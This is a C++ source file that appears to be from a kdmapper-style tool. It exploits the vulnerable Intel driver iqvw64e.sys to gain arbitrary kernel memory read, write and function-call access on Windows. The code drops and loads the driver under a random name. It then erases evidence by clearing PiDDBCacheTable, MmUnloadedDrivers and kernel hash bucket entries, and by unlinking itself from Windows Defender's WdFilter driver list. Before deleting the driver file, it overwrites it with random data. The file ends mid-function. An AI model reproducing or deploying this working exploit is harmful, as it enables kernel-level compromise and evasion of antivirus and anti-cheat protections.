#define DISABLE_OUTPUT
#include "drv.hpp"
#include <Windows.h>
#include <string>
#include <fstream>

#include "utl.hpp"
#include "drv_res.hpp"
#include "svc.hpp"
#include "nt.hpp"
#include "pe.hpp"

#ifdef PDB_OFFSETS
#include "sym.h"
#endif
// i will NOT try to explain this here
typedef struct _COPY_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t source;
	uint64_t destination;
	uint64_t length;
}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

typedef struct _FILL_MEMORY_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint32_t value;
	uint32_t reserved2;
	uint64_t destination;
	uint64_t length;
}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_physical_address;
	uint64_t address_to_translate;
}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

typedef struct _MAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved;
	uint64_t return_value;
	uint64_t return_virtual_address;
	uint64_t physical_address_to_map;
	uint32_t size;
}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
{
	uint64_t case_number;
	uint64_t reserved1;
	uint64_t reserved2;
	uint64_t virt_address;
	uint64_t reserved3;
	uint32_t number_of_bytes;
}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

HANDLE mod::drv::hDevice = 0;
ULONG64 mod::drv::ntoskrnlAddr = 0;
std::string cachedDriverName = "";

std::wstring mod::drv::GetDriverNameW() {
	if (cachedDriverName.empty()) {

		char buffer[100]{};
		static const char alphanum[] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		int len = rand() % 20 + 10;
		for (int i = 0; i < len; ++i)
			buffer[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
		cachedDriverName = buffer;
	}

	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
	return name;
}

std::wstring mod::drv::GetDriverPath() {
	std::wstring temp = mod::utl::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

bool mod::drv::IsRunning() {
	const HANDLE file_handle = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

NTSTATUS mod::drv::AcquireDebugPrivilege() {

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL) {
		return STATUS_UNSUCCESSFUL;
	}

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled;
	NTSTATUS Status = nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		LOG("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}

NTSTATUS mod::drv::Load() {
	srand((unsigned)time(NULL) * GetCurrentThreadId());

	if (mod::drv::IsRunning()) {

		LOG(L"[-] \\Device\\Nal is already in use." << std::endl);
		LOG(L"[-] already loaded or another instance running" << std::endl);
		LOG(L"[-] restart PC to resolve" << std::endl);
		LOG(L"[-] or unload manually from %temp%" << std::endl);
		LOG(L"[+] loaded" << std::endl);
		return STATUS_ALREADY_REGISTERED;
	}

	LOG(L"[<] Loading vulnerable driver, Name: " << GetDriverNameW() << std::endl);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {

		LOG(L"[-] Can't find TEMP folder" << std::endl);
		return STATUS_UNSUCCESSFUL;
	}

	_wremove(driver_path.c_str());

	if (!mod::utl::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(mod::drv_res::driver), sizeof(mod::drv_res::driver))) {

		LOG(L"[-] Failed to create vulnerable driver file" << std::endl);
		return STATUS_DISK_OPERATION_FAILED;
	}

	auto status = AcquireDebugPrivilege();
	if (!NT_SUCCESS(status)) {

		LOG(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
		_wremove(driver_path.c_str());
		return status;
	}

	status = mod::svc::RegisterAndStart(driver_path, GetDriverNameW());
	if (!NT_SUCCESS(status)) {
		char msg[256];

		LOG(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
		_wremove(driver_path.c_str());
		return status;
	}

	hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{

		LOG(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
		mod::drv::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = mod::utl::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {

		LOG(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		mod::drv::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!mod::drv::ReadMemory(mod::drv::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {

		LOG(L"[-] Can't exploit intel driver, is there any antivirus or anticheat running?" << std::endl);
		mod::drv::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	if (!mod::drv::ClearPiDDBCacheTable()) {

		LOG(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		mod::drv::Unload();
		return STATUS_DELETE_PENDING | 0x1000; 
	}

	if (!mod::drv::ClearKernelHashBucketList()) {

		LOG(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		mod::drv::Unload();
		return STATUS_DELETE_PENDING | 0x2000;
	}

	if (!mod::drv::ClearMmUnloadedDrivers()) {

		LOG(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
		mod::drv::Unload();
		return STATUS_DELETE_PENDING | 0x3000;
	}

	if (!mod::drv::ClearWdFilterDriverList()) {

		LOG("[!] Failed to ClearWdFilterDriverList" << std::endl);
		mod::drv::Unload();
		return STATUS_DELETE_PENDING | 0x4000;
	}

	return STATUS_SUCCESS;
}

bool mod::drv::ClearWdFilterDriverList() {

	auto WdFilter = mod::utl::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		LOG("[+] WdFilter.sys not loaded, clear skipped" << std::endl);
		return true;
	}

#ifdef PDB_OFFSETS
	uintptr_t MpBmDocOpenRules = KDSymbolsHandler::GetInstance()->GetOffset(L"MpBmDocOpenRules");
	if (!MpBmDocOpenRules)
	{
		LOG("[-] Failed To Get MpBmDocOpenRules." << std::endl);
		return false;
	}
	MpBmDocOpenRules += WdFilter;

	uintptr_t RuntimeDriversList_Head = MpBmDocOpenRules + 0x70;
	uintptr_t RuntimeDriversCount = MpBmDocOpenRules + 0x60;
	uintptr_t RuntimeDriversArray = MpBmDocOpenRules + 0x68;

	if (RuntimeDriversList_Head < 0x1000 || RuntimeDriversCount < 0x1000 || RuntimeDriversArray < 0x1000) {
		LOG("[-] Invalid WdFilter driver list pointers calculated." << std::endl);
		return false;
	}

	if (!ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t)) || RuntimeDriversArray < 0x1000) {
		LOG("[-] Failed to read WdFilter RuntimeDriversArray or it is an invalid address." << std::endl);
		return false;
	}

	uintptr_t MpFreeDriverInfoEx = KDSymbolsHandler::GetInstance()->GetOffset(L"MpFreeDriverInfoEx");
	if (!MpFreeDriverInfoEx)
	{
		LOG("[-] Failed To Get MpFreeDriverInfoEx." << std::endl);
		return false;
	}
	MpFreeDriverInfoEx += WdFilter;
#else
	auto RuntimeDriversList = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\xFF\x05", "xxx????xx");
	if (!RuntimeDriversList) {
		LOG("[!] Failed to find WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	auto RuntimeDriversCountRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\xFF\x05\x00\x00\x00\x00\x48\x39\x11", "xx????xxx");
	if (!RuntimeDriversCountRef) {
		LOG("[!] Failed to find WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	auto MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?xx???????????x");
	if (!MpFreeDriverInfoExRef) {

		MpFreeDriverInfoExRef = FindPatternInSectionAtKernel("PAGE", WdFilter, (PUCHAR)"\x89\x00\x08\x00\x00\x00\xE8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE9", "x?x???x???????????x");
		if (!MpFreeDriverInfoExRef) {
			LOG("[!] Failed to find WdFilter MpFreeDriverInfoEx" << std::endl);
			return false;
		}
		else {
			LOG("[+] Found WdFilter MpFreeDriverInfoEx with second pattern" << std::endl);
		}
		MpFreeDriverInfoExRef += 0x3; 
	}

	MpFreeDriverInfoExRef += 0x3; 

	RuntimeDriversList = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversList, 3, 7);
	if (RuntimeDriversList < 0x1000) {
		LOG("[!] Failed to resolve WdFilter RuntimeDriversList" << std::endl);
		return false;
	}

	uintptr_t RuntimeDriversList_Head = RuntimeDriversList - 0x8;
	uintptr_t RuntimeDriversCount = (uintptr_t)ResolveRelativeAddress((PVOID)RuntimeDriversCountRef, 2, 6);
	if (RuntimeDriversCount < 0x1000) {
		LOG("[!] Failed to resolve WdFilter RuntimeDriversCount" << std::endl);
		return false;
	}

	uintptr_t RuntimeDriversArray = RuntimeDriversCount + 0x8;
	if (!ReadMemory(RuntimeDriversArray, &RuntimeDriversArray, sizeof(uintptr_t)) || RuntimeDriversArray < 0x1000) {
		LOG("[!] Failed to read WdFilter RuntimeDriversArray or it is an invalid address" << std::endl);
		return false;
	}

	uintptr_t MpFreeDriverInfoEx = (uintptr_t)ResolveRelativeAddress((PVOID)MpFreeDriverInfoExRef, 1, 5);
	if (MpFreeDriverInfoEx < 0x1000) {
		LOG("[!] Failed to resolve WdFilter MpFreeDriverInfoEx" << std::endl);
		return false;
	}
#endif

	auto ReadListEntry = [&](uintptr_t Address) -> LIST_ENTRY* { 
		LIST_ENTRY* Entry;
		if (!ReadMemory(Address, &Entry, sizeof(LIST_ENTRY*))) return 0;
		return Entry;
	};

	for (LIST_ENTRY* Entry = ReadListEntry(RuntimeDriversList_Head);
		Entry != (LIST_ENTRY*)RuntimeDriversList_Head;
		Entry = ReadListEntry((uintptr_t)Entry + (offsetof(struct _LIST_ENTRY, Flink))))
	{
		UNICODE_STRING Unicode_String;
		if (ReadMemory((uintptr_t)Entry + 0x10, &Unicode_String, sizeof(UNICODE_STRING))) {
			auto ImageName = std::make_unique<wchar_t[]>((ULONG64)Unicode_String.Length / 2ULL + 1ULL);
			if (ReadMemory((uintptr_t)Unicode_String.Buffer, ImageName.get(), Unicode_String.Length)) {
				if (wcsstr(ImageName.get(), mod::drv::GetDriverNameW().c_str())) {

					bool removedRuntimeDriversArray = false;
					PVOID SameIndexList = (PVOID)((uintptr_t)Entry - 0x10);
					for (int k = 0; k < 256; k++) { 
						PVOID value = 0;
						ReadMemory(RuntimeDriversArray + (k * 8), &value, sizeof(PVOID));
						if (value == SameIndexList) {
							PVOID emptyval = (PVOID)(RuntimeDriversCount + 1); 
							WriteMemory(RuntimeDriversArray + (k * 8), &emptyval, sizeof(PVOID));
							removedRuntimeDriversArray = true;
							break;
						}
					}

					if (!removedRuntimeDriversArray) {
						LOG("[!] Failed to remove from RuntimeDriversArray" << std::endl);
						return false;
					}

					auto NextEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Flink)));
					auto PrevEntry = ReadListEntry(uintptr_t(Entry) + (offsetof(struct _LIST_ENTRY, Blink)));

					WriteMemory(uintptr_t(NextEntry) + (offsetof(struct _LIST_ENTRY, Blink)), &PrevEntry, sizeof(LIST_ENTRY::Blink));
					WriteMemory(uintptr_t(PrevEntry) + (offsetof(struct _LIST_ENTRY, Flink)), &NextEntry, sizeof(LIST_ENTRY::Flink));

					ULONG current = 0;
					ReadMemory(RuntimeDriversCount, &current, sizeof(ULONG));
					current--;
					WriteMemory(RuntimeDriversCount, &current, sizeof(ULONG));

					uintptr_t DriverInfo = (uintptr_t)Entry - 0x20;

					USHORT Magic = 0;
					ReadMemory(DriverInfo, &Magic, sizeof(USHORT));
					if (Magic != 0xDA18) {
						LOG("[!] DriverInfo Magic is invalid, new wdfilter version?, driver info will not be released to prevent bsod" << std::endl);
					}
					else {
						CallKernelFunction<void>(nullptr, MpFreeDriverInfoEx, DriverInfo);
					}

					LOG("[+] WdFilterDriverList Cleaned: " << ImageName << std::endl);
					return true;
				}
			}
		}
	}
	return false;
}

NTSTATUS mod::drv::Unload() {
	LOG(L"[<] Unloading vulnerable driver" << std::endl);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
	}

	auto status = mod::svc::StopAndRemove(GetDriverNameW());
	if (!NT_SUCCESS(status))
		return status;

	std::wstring driver_path = GetDriverPath();

	std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
	if (!file_ofstream.is_open()) {
		LOG(L"[!] Error opening driver file to dump random data inside the disk" << std::endl);
		return STATUS_DELETE_PENDING;
	}

	int newFileLen = sizeof(mod::drv_res::driver) + (((long long)rand()*(long long)rand()) % 2000000 + 1000);
	BYTE* randomData = new BYTE[newFileLen];
	for (size_t i = 0; i < newFileLen; i++) {
		randomData[i] = (BYTE)(rand() % 255);
	}
	if (!file_ofstream.write((char*)randomData, newFileLen)) {
		LOG(L"[!] Error dumping shit inside the disk" << std::endl);
	}
	else {
		LOG(L"[+] Vul driver data destroyed before unlink" << std::endl);
	}
	file_ofstream.close();
	delete[] randomData;

	if (_wremove(driver_path.c_str()) != 0)
		return STATUS_DELETE_PENDING;

	return STATUS_SUCCESS;
}

bool mod::drv::MemCopy(uint64_t destination, uint64_t source, uint64_t size) {
	if (!destination || !source || !size)
		return 0;

	COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

	copy_memory_buffer.case_number = 0x33;
	copy_memory_buffer.source = source;
	copy_memory_buffer.destination = destination;
	copy_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl1, &copy_memory_buffer, sizeof(copy_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool mod::drv::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return 0;

	FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

	fill_memory_buffer.case_number = 0x30;
	fill_memory_buffer.destination = address;
	fill_memory_buffer.value = value;
	fill_memory_buffer.length = size;

	DWORD bytes_returned = 0;
	return DeviceIoControl(hDevice, ioctl1, &fill_memory_buffer, sizeof(fill_memory_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool mod::drv::GetPhysicalAddress(uint64_t address, uint64_t* out_physical_address) {
	if (!address)
		return 0;

	GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

	get_phys_address_buffer.case_number = 0x25;
	get_phys_address_buffer.address_to_translate = address;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl1, &get_phys_address_buffer, sizeof(get_phys_address_buffer), nullptr, 0, &bytes_returned, nullptr))
		return false;

	*out_physical_address = get_phys_address_buffer.return_physical_address;
	return true;
}

uint64_t mod::drv::MapIoSpace(uint64_t physical_address, uint32_t size) {
	if (!physical_address || !size)
		return 0;

	MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

	map_io_space_buffer.case_number = 0x19;
	map_io_space_buffer.physical_address_to_map = physical_address;
	map_io_space_buffer.size = size;

	DWORD bytes_returned = 0;

	if (!DeviceIoControl(hDevice, ioctl1, &map_io_space_buffer, sizeof(map_io_space_buffer), nullptr, 0, &bytes_returned, nullptr))
		return 0;

	return map_io_space_buffer.return_virtual_address;
}

bool mod::drv::UnmapIoSpace(uint64_t address, uint32_t size) {
	if (!address || !size)
		return false;

	UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

	unmap_io_space_buffer.case_number = 0x1A;
	unmap_io_space_buffer.virt_address = address;
	unmap_io_space_buffer.number_of_bytes = size;

	DWORD bytes_returned = 0;

	return DeviceIoControl(hDevice, ioctl1, &unmap_io_space_buffer, sizeof(unmap_io_space_buffer), nullptr, 0, &bytes_returned, nullptr);
}

bool mod::drv::ReadMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(reinterpret_cast<uint64_t>(buffer), address, size);
}

bool mod::drv::WriteMemory(uint64_t address, void* buffer, uint64_t size) {
	return MemCopy(address, reinterpret_cast<uint64_t>(buffer), size);
}

bool mod::drv::WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t physical_address = 0;

	if (!GetPhysicalAddress(address, &physical_address)) {
		LOG(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void*>(address) << std::endl);
		return false;
	}

	const uint64_t mapped_physical_memory = MapIoSpace(physical_address, size);

	if (!mapped_physical_memory) {
		LOG(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
		return false;
	}

	bool result = WriteMemory(mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
	UnmapIoSpace(mapped_physical_memory, size);
#else
	if (!UnmapIoSpace(mapped_physical_memory, size))
		LOG(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void*>(physical_address) << std::endl);
#endif

	return result;
}

uint64_t mod::drv::MmAllocateIndependentPagesEx(uint32_t size)
{
	uint64_t allocated_pages{};

	static uint64_t kernel_MmAllocateIndependentPagesEx = 0;

#ifdef PDB_OFFSETS	
	if (!kernel_MmAllocateIndependentPagesEx)
	{
		kernel_MmAllocateIndependentPagesEx = KDSymbolsHandler::GetInstance()->GetOffset(L"MmAllocateIndependentPagesEx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			LOG(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
		kernel_MmAllocateIndependentPagesEx += mod::drv::ntoskrnlAddr;
	}
#else
	if (!kernel_MmAllocateIndependentPagesEx)
	{

		kernel_MmAllocateIndependentPagesEx = mod::drv::FindPatternInSectionAtKernel((char*)".text", mod::drv::ntoskrnlAddr,
			(BYTE*)"\x41\x8B\xD6\xB9\x00\x10\x00\x00\xE8\x00\x00\x00\x00\x48\x8B\xD8",
			(char*)"xxxxxxxxx????xxx");
		if (!kernel_MmAllocateIndependentPagesEx) {
			LOG(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}

		kernel_MmAllocateIndependentPagesEx += 8;

		kernel_MmAllocateIndependentPagesEx = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmAllocateIndependentPagesEx, 1, 5);
		if (!kernel_MmAllocateIndependentPagesEx) {
			LOG(L"[!] Failed to find MmAllocateIndependentPagesEx" << std::endl);
			return 0;
		}
	}
#endif

	if (!mod::drv::CallKernelFunction(&allocated_pages, kernel_MmAllocateIndependentPagesEx, size, -1, 0, 0))
		return 0;

	return allocated_pages;
}

bool mod::drv::MmFreeIndependentPages(uint64_t address, uint32_t size)
{
	static uint64_t kernel_MmFreeIndependentPages = 0;

	if (!kernel_MmFreeIndependentPages)
	{
#ifdef PDB_OFFSETS	
		kernel_MmFreeIndependentPages = KDSymbolsHandler::GetInstance()->GetOffset(L"MmFreeIndependentPages");
		if (!kernel_MmFreeIndependentPages) {
			LOG(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
		kernel_MmFreeIndependentPages += mod::drv::ntoskrnlAddr;
#else
		kernel_MmFreeIndependentPages = mod::drv::FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr,
			(BYTE*)"\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF",
			(char*)"xxxxxxxxx????xxxxxxx");
		if (!kernel_MmFreeIndependentPages) {

			LOG(L"[+] Trying second pattern for MmFreeIndependentPages" << std::endl);

			kernel_MmFreeIndependentPages = mod::drv::FindPatternInSectionAtKernel("PAGE", mod::drv::ntoskrnlAddr,
				(BYTE*)"\x8B\x15\x00\x00\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B",
				(char*)"xx????xxxx????xxx");

			if (!kernel_MmFreeIndependentPages) {
				LOG(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
				return false;
			}

			kernel_MmFreeIndependentPages += 9; 
		}
		else {
			kernel_MmFreeIndependentPages += 8;
		}

		kernel_MmFreeIndependentPages = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmFreeIndependentPages, 1, 5);
		if (!kernel_MmFreeIndependentPages) {
			LOG(L"[!] Failed to find MmFreeIndependentPages" << std::endl);
			return false;
		}
#endif
	}

	uint64_t result{};
	return mod::drv::CallKernelFunction(&result, kernel_MmFreeIndependentPages, address, size);
}

BOOLEAN mod::drv::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect)
{
	if (!address)
	{
		LOG(L"[!] Invalid address passed to MmSetPageProtection" << std::endl);
		return FALSE;
	}

	static uint64_t kernel_MmSetPageProtection = 0;

	if (!kernel_MmSetPageProtection)
	{
#ifdef PDB_OFFSETS	
		kernel_MmSetPageProtection = KDSymbolsHandler::GetInstance()->GetOffset(L"MmSetPageProtection");
		if (!kernel_MmSetPageProtection) {
			LOG(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
		kernel_MmSetPageProtection += mod::drv::ntoskrnlAddr;
#else

		kernel_MmSetPageProtection = mod::drv::FindPatternInSectionAtKernel("PAGELK", mod::drv::ntoskrnlAddr, 
			(BYTE*)"\x0F\x45\x00\x00\x8D\x00\x00\x00\xFF\xFF\xE8",
			(char*)"xx??x???xxx");
		if (!kernel_MmSetPageProtection) {

			kernel_MmSetPageProtection = mod::drv::FindPatternInSectionAtKernel("PAGELK", mod::drv::ntoskrnlAddr,
				(BYTE*)"\x0F\x45\x00\x00\x45\x8B\x00\x00\x00\x00\x8D\x00\x00\x00\x00\x00\x00\xFF\xFF\xE8",
				(char*)"xx??xx????x???xxx");

			if (!kernel_MmSetPageProtection) {
				LOG(L"[!] Failed to find MmSetPageProtection" << std::endl);
				return FALSE;
			}

			kernel_MmSetPageProtection += 13;
		}
		else {
			kernel_MmSetPageProtection += 10;
		}

		kernel_MmSetPageProtection = (uint64_t)ResolveRelativeAddress((PVOID)kernel_MmSetPageProtection, 1, 5);
		if (!kernel_MmSetPageProtection) {
			LOG(L"[!] Failed to find MmSetPageProtection" << std::endl);
			return FALSE;
		}
#endif
	}

	BOOLEAN set_prot_status{};
	if (!mod::drv::CallKernelFunction(&set_prot_status, kernel_MmSetPageProtection, address, size, new_protect))
		return FALSE;

	return set_prot_status;
}

uint64_t mod::drv::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePool = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "ExAllocatePoolWithTag");

	if (!kernel_ExAllocatePool) {
		LOG(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	uint64_t allocated_pool = 0;

	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE')) 
		return 0;

	return allocated_pool;
}

bool mod::drv::FreePool(uint64_t address) {
	if (!address)
		return 0;

	static uint64_t kernel_ExFreePool = GetKernelModuleExport(mod::drv::ntoskrnlAddr, "ExFreePool");

	if (!kernel_ExFreePool) {
		LOG(L"[!] Failed to find ExAllocatePool" << std::endl);
		return 0;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t mod::drv::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
		!ReadMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

	if (!ReadMemory(kernel_module_base + export_base, export_data, export_base_size))
	{
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {

				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			if (function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0; 
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

bool mod::drv::ClearMmUnloadedDrivers() {
	ULONG buffer_size = 0;
	void* buffer = nullptr;

	NTSTATUS status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);

		buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation), buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status) || buffer == nullptr)
	{
		if (buffer != nullptr)
			VirtualFree(buffer, 0, MEM_RELEASE);
		return false;
	}

	uint64_t object = 0;

	auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

	for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i)
	{
		const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

		if (current_system_handle.UniqueProcessId != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
			continue;

		if (current_system_handle.HandleValue == hDevice)
		{
			object = reinterpret_cast<uint64_t>(current_system_handle.Object);
			break;
		}
	}

	VirtualFree(buffer, 0, MEM_RELEASE);

	if (!object)
		return false;

	uint64_t device_object = 0;

	if (!ReadMemory(object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
		LOG(L"[!] Failed to find device_object" << std::endl);
		return false;
	}

	uint64_t driver_object = 0;

	if (!ReadMemory(device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
		LOG(L"[!] Failed to find driver_object" << std::endl);
		return false;
	}

	uint64_t driver_section = 0;

	if (!ReadMemory(driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
		LOG(L"[!] Failed to find driver_section" << std::endl);
		return false;
	}

	UNICODE_STRING us_driver_base_dll_name = { 0 };

	if (!ReadMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name)) || us_driver_base_dll_name.Length == 0) {
		LOG(L"[!] Failed to find driver name" << std::endl);
		return false;
	}

	auto unloadedName = std::make_unique<wchar_t[]>((ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL);
	if (!ReadMemory((uintptr_t)us_driver_base_dll_name.Buffer, unloadedName.get(), us_driver_base_dll_name.Length)) {
		LOG(L"[!] Failed to read driver name" << std::endl);
		return false;
	}

	us_driver_base_dll_name.Length = 0; 

	if (!WriteMemory(driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
		LOG(L"[!] Failed to write driver name length" << std::endl);
		return false;
	}

	LOG(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);
	return true;
}

PVOID mod::drv::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
